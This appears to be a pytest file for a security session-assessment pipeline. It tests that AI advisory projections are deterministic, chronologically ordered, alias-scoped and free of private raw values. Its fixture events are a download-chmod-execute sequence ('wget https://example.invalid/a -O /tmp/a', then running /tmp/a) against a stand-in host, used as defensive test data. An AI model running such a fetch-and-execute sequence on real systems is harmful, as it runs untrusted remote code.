from __future__ import annotations

import copy
import hashlib
import json
import re

import pytest

from production.ai_advisory.contracts import AIAdvisoryContractError, sha256_json
from production.ai_advisory.projection import (
    V2_PROHIBITED_FIELDS,
    build_ai_advisory_projection_v2,
    validate_ai_advisory_projection_v2,
)
from production.ai_advisory.security import AssessmentAliasScope
from production.reporting.canonical_graph_queries import (
    CanonicalGraphQueryError,
    chronological_graph_view,
)
from production.reporting.session_assessment_v6 import build_session_assessment_v6
from production.utils.serialization import stable_json
from tests.test_cross_family_relationship_evaluation import (
    BEHAVIOR_POLICY,
    CLASSIFICATION_POLICY,
    _payload,
)


AI_POLICY = "evaluation/final_f_ai_advisory_policy.v2.proposed.json"
PROJECTION_CONTRACT = "evaluation/final_f_contract_bundle.v1.json"
ALIAS_KEY = b"phase-3-known-answer-alias-key!!"
ALIAS_RE = re.compile(r"^a_[0-9a-f]{32}$")
RAW_VALUES = (
    "wget https://example.invalid/a -O /tmp/a",
    "chmod 700 /tmp/a",
    "/tmp/a",
    "example.invalid",
    "192.0.2.181",
)


def _assessment(case_id: str = "phase3-known-answer") -> dict:
    payload = _payload({
        "case_id": case_id,
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    })
    return build_session_assessment_v6(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )


def _scope(report: dict, provider: str = "phase3-test-provider") -> AssessmentAliasScope:
    return AssessmentAliasScope(ALIAS_KEY, provider, report["assessment_id"])


def _projection(report: dict, scope: AssessmentAliasScope | None = None) -> dict:
    return build_ai_advisory_projection_v2(
        report,
        alias_scope=scope or _scope(report),
        ai_policy_path=AI_POLICY,
        projection_contract_path=PROJECTION_CONTRACT,
    )


def _rehash_graph(graph: dict) -> None:
    basis = copy.deepcopy(graph)
    basis.pop("graph_sha256", None)
    graph["graph_sha256"] = hashlib.sha256(
        stable_json(basis).encode("utf-8")
    ).hexdigest()


def _walk_keys(value: object):
    if isinstance(value, dict):
        for key, item in value.items():
            yield key
            yield from _walk_keys(item)
    elif isinstance(value, list):
        for item in value:
            yield from _walk_keys(item)


def test_known_answer_a_b_c_is_deterministic_chronological_and_private() -> None:
    report = _assessment()
    first = _projection(report)
    second = _projection(report)
    assert first == second
    assert [step["ordinal"] for step in first["timeline_steps"]] == [1, 2, 3]
    assert [step["semantic_families"] for step in first["timeline_steps"]] == [
        ["transfer_attempt"], ["filesystem"], ["execution"]
    ]
    ordinal_by_fact = {
        fact["fact_id"]: fact["causal_ordinal"] for fact in first["facts"]
    }
    assert all(
        ordinal_by_fact[edge["source_fact_id"]]
        < ordinal_by_fact[edge["target_fact_id"]]
        for edge in first["relationships"]
    )
    assert all(ALIAS_RE.fullmatch(fact["fact_id"]) for fact in first["facts"])
    serialized = stable_json(first)
    assert not set(_walk_keys(first)).intersection(V2_PROHIBITED_FIELDS)
    assert all(value not in serialized for value in RAW_VALUES)
    # Classification-only evidence has no sequence index. It may be referenced
    # by a fact, but the six evidence nodes still yield only three causal steps.
    graph = report["canonical_evidence"]["semantic_graph"]
    assert sum(item["sequence_index"] is None for item in graph["evidence_nodes"]) == 3
    assert len(first["timeline_steps"]) == 3


def test_aliases_are_assessment_and_provider_scoped_and_kind_checked() -> None:
    first_report = _assessment("phase3-alias-one")
    second_report = _assessment("phase3-alias-two")
    first = _scope(first_report)
    same = _scope(first_report)
    second = _scope(second_report)
    other_provider = _scope(first_report, "other-provider")
    local_id = first_report["canonical_evidence"]["semantic_graph"]["fact_nodes"][0][
        "fact_id"
    ]
    alias = first.alias("fact", local_id)
    assert alias == same.alias("fact", local_id)
    assert alias != second.alias("fact", local_id)
    assert alias != other_provider.alias("fact", local_id)
    assert first.restore("fact", alias) == local_id
    with pytest.raises(ValueError, match="kind"):
        first.restore("entity", alias)
    with pytest.raises(ValueError, match="not mapped"):
        first.restore("fact", "a_" + "0" * 32)


def test_chronology_fails_closed_on_reversed_cycle_and_missing_order() -> None:
    report = _assessment()
    original = report["canonical_evidence"]["semantic_graph"]

    reversed_graph = copy.deepcopy(original)
    edge = reversed_graph["relationship_edges"][0]
    edge["source_fact_ref"], edge["target_fact_ref"] = (
        edge["target_fact_ref"], edge["source_fact_ref"]
    )
    _rehash_graph(reversed_graph)
    with pytest.raises(CanonicalGraphQueryError, match="order"):
        chronological_graph_view(reversed_graph)

    cycle_graph = copy.deepcopy(original)
    edge = copy.deepcopy(cycle_graph["relationship_edges"][0])
    edge["relationship_id"] = "typed_semantic_relationship_phase3_cycle"
    edge["source_fact_ref"], edge["target_fact_ref"] = (
        edge["target_fact_ref"], edge["source_fact_ref"]
    )
    cycle_graph["relationship_edges"].append(edge)
    _rehash_graph(cycle_graph)
    with pytest.raises(CanonicalGraphQueryError):
        chronological_graph_view(cycle_graph)

    missing_graph = copy.deepcopy(original)
    first_fact = min(
        missing_graph["fact_nodes"],
        key=lambda item: next(
            node["sequence_index"]
            for ref in item["source_evidence_refs"]
            for node in missing_graph["evidence_nodes"]
            if node["evidence_id"] == ref and node["sequence_index"] is not None
        ),
    )
    refs = set(first_fact["source_evidence_refs"])
    for evidence in missing_graph["evidence_nodes"]:
        if evidence["evidence_id"] in refs:
            evidence["sequence_index"] = None
    _rehash_graph(missing_graph)
    with pytest.raises(CanonicalGraphQueryError, match="placement"):
        chronological_graph_view(missing_graph)


def test_projection_rejects_stale_hashes_unresolved_aliases_and_private_fields() -> None:
    report = _assessment()
    scope = _scope(report)
    projection = _projection(report, scope)

    stale = copy.deepcopy(projection)
    stale["graph_sha256"] = "f" * 64
    stale["projection_sha256"] = sha256_json({
        key: value for key, value in stale.items() if key != "projection_sha256"
    })
    with pytest.raises(AIAdvisoryContractError, match="graph_sha256 mismatch"):
        validate_ai_advisory_projection_v2(
            stale,
            report=report,
            alias_scope=scope,
            ai_policy_path=AI_POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )

    unresolved = copy.deepcopy(projection)
    unresolved["relationships"][0]["source_fact_id"] = "a_" + "0" * 32
    unresolved["projection_sha256"] = sha256_json({
        key: value for key, value in unresolved.items()
        if key != "projection_sha256"
    })
    with pytest.raises(AIAdvisoryContractError, match="current graph"):
        validate_ai_advisory_projection_v2(
            unresolved,
            report=report,
            alias_scope=scope,
            ai_policy_path=AI_POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )

    private = copy.deepcopy(projection)
    private["raw_command"] = RAW_VALUES[0]
    with pytest.raises(AIAdvisoryContractError, match="additionalProperties"):
        validate_ai_advisory_projection_v2(
            private,
            report=report,
            alias_scope=scope,
            ai_policy_path=AI_POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )


def test_projection_fails_closed_on_policy_contract_and_assessment_mismatch(tmp_path) -> None:
    report = _assessment()
    altered_policy = json.loads(open(AI_POLICY, encoding="utf-8").read())
    altered_policy["limits"]["max_chains"] += 1
    policy_path = tmp_path / "policy.json"
    policy_path.write_text(json.dumps(altered_policy), encoding="utf-8")
    with pytest.raises(AIAdvisoryContractError, match="policy v2 identity"):
        build_ai_advisory_projection_v2(
            report,
            alias_scope=_scope(report),
            ai_policy_path=str(policy_path),
            projection_contract_path=PROJECTION_CONTRACT,
        )

    other = _assessment("phase3-stale-scope")
    with pytest.raises(AIAdvisoryContractError, match="scope is stale"):
        build_ai_advisory_projection_v2(
            report,
            alias_scope=_scope(other),
            ai_policy_path=AI_POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )
